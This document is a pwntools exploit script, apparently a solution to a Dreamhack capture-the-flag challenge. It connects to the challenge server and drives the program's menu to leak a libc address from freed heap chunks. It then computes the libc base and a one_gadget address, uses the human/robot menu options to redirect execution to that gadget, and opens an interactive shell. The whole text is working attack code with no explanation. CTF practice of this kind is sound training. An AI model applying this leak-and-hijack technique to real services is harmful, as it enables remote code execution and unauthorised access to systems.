from pwn import *

p = remote("host1.dreamhack.games", 9937)

def slog(sym, val): success(sym + ": " + hex(val))

def human(weight, age):
    p.sendlineafter(">", "1")
    p.sendlineafter(": ", str(weight))
    p.sendlineafter(": ", str(age))

def robot(weight):
    p.sendlineafter(">", "2")
    p.sendlineafter(": ", str(weight))

def custom(size, data, idx):
    p.sendlineafter(">", "3")
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", data)
    p.sendlineafter(": ", str(idx))


custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", 0)
custom(0x500, "B", -1)

lb = u64(p.recvline()[:-1].ljust(8, b"\x00")) - 0x3ebc42
og = lb + 0x10a41c

slog("libc_base", lb)
slog("one_gadget", og)

human("1", og)
robot("1")

p.interactive()
